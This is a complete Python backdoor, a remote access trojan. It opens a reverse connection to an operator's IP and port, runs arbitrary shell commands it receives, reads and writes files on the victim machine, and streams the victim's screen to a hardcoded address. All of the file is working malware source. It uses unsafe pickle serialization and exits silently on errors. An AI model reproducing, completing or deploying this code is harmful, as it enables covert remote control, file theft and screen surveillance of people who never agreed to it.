import socket , threading , select
import subprocess , pickle ,os 
from vidstream import ScreenShareClient
import sys

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    

    def execute_system_command(self,command):
        result = subprocess.check_output(command, shell = True)
        result = pickle.dumps(result)
        return result
    
    def reliable_result(self):
        recived_data = b""
        while True:
            try:
                recived_data = recived_data + self.connection.recv(1024)
                return pickle.loads(recived_data)
            except Exception as e:
                continue
    def change_working_directory(self,path):
        os.chdir(path)
        result = "[+] changing directory to "+str(path)
        result = pickle.dumps(result)
        return result
    
    def read_file(self,path):
        with open(path,"rb") as file:
            return file.read()
        
    def write_file(self,path,content):
        content = pickle.loads(content)
        with open(path,"wb") as file:
            file.write(content)
        return "[+] uploading is done"
    def stream(self):
        sender = ScreenShareClient('192.168.0.121',3333)
        t = threading.Thread(target=sender.start_stream)
        t.start()
        print('establised connection')
        while True:
            readable,_,_ = select.select([self.connection],[],[],0)
            if self.connection in readable:
                data = self.connection.recv(1024).decode('utf-8')
                print('got data')
                if data == 'stop':
                    sender.stop_stream()
                    print('ended')
                    break
    def run(self):
        while True:
            command_result = ''
            command_list = self.reliable_result()
            if command_list[0] == 'exit':
                self.connection.close()
                sys.exit()
            elif command_list[0] == 'cd' and len(command_list) > 1:
                command_result = self.change_working_directory(command_list[1])
            elif command_list[0] == 'download':
                command_result = self.read_file(command_list[1])
                command_result = pickle.dumps(command_result)
            elif command_list[0] == 'upload':
                command_result = self.write_file(command_list[1],command_list[2])
                command_result = pickle.dumps(command_result)
            elif command_list[0] == 'screen':
                self.stream()
                #command_result = pickle.dumps(command_result)
            else:
                command_result = self.execute_system_command(command_list[0]) 
            #command_string = pickle.loads(command_pickle)
            #print(type(recived_data_string))
            #print(recived_data_string)
            #command_result = self.execute_system_command(command_list[0])
            if len(command_result)>1:
                self.connection.send(command_result)

try:
    my_backdoor = Backdoor("IP",PORT)
    my_backdoor.run()
except Exception:
    sys.exit()
